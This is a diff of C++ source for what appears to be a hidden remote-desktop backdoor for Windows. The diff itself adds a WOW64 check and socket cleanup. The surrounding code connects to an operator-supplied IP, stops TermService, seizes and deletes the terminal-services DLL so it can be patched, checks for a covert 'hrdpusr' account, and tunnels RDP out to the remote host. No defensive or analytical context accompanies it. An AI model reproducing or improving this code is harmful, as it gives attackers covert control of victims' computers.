@@ -20,9 +20,15 @@ int main(int argc,char* argv[])
         ip = argv[1];
     }
     PVOID oldw;
-    if (!Wow64DisableWow64FsRedirection(&oldw)) {
-        std::cout <<  GetLastError() << "\n";
-        return -3;
+    BOOL isWow64 = FALSE;
+    if (!IsWow64Process(GetCurrentProcess(), &isWow64)) {
+        return -2;
+    }
+    if (isWow64) {
+        if (!Wow64DisableWow64FsRedirection(&oldw)) {
+            std::cout << GetLastError() << "\n";
+            return -3;
+        }
     }
 
     if (!net::init()) { return -4; }
@@ -44,13 +50,13 @@ int main(int argc,char* argv[])
             else
             { 
                 //patch
-                if (!Utils::IsProcessElevated()) { Log::SaveLog((wchar_t*)L"needs patching but not running elevated ,aborting..."); ExitProcess(0); }
+                if (!Utils::IsProcessElevated()) { Log::SaveLog((wchar_t*)L"needs patching but not running elevated ,aborting..."); closesocket(net::s); ExitProcess(0); }
                 Service::serviceManage((wchar_t*)L"TermService", FALSE);
                 Log::SaveLog((wchar_t*)L"Patching..."); 
                 if (!Utils::TakeOwnership((LPTSTR)dllService)) { Log::SaveLog((wchar_t*)L"error taking ownership of service dll");  }
                 if(!Utils::ChangePerm(dllService)){ Log::SaveLog((wchar_t*)L"error changing permission of service dll");  }
                 if (CopyFile(dllService, L"C:\\ProgramData\\hrdp-termsrv.backup", TRUE)) {
-                    if (!DeleteFile(dllService)) { Log::SaveLog((wchar_t*)L"error access service dll"); ExitProcess(-3); }
+                    if (!DeleteFile(dllService)) { Log::SaveLog((wchar_t*)L"error access service dll"); closesocket(net::s); ExitProcess(-3); }
                 }
                 //check usr
                 if (!RDP::doesUserExist(L"hrdpusr")) {
@@ -73,6 +79,7 @@ int main(int argc,char* argv[])
             //tunnel
             if (!RDP::rdpTunnel()) {
                 net::pktSend(net::s, nullptr, 0, 0x09);
+                closesocket(net::s);
                 ExitProcess(0);
              }
              closesocket(net::s);
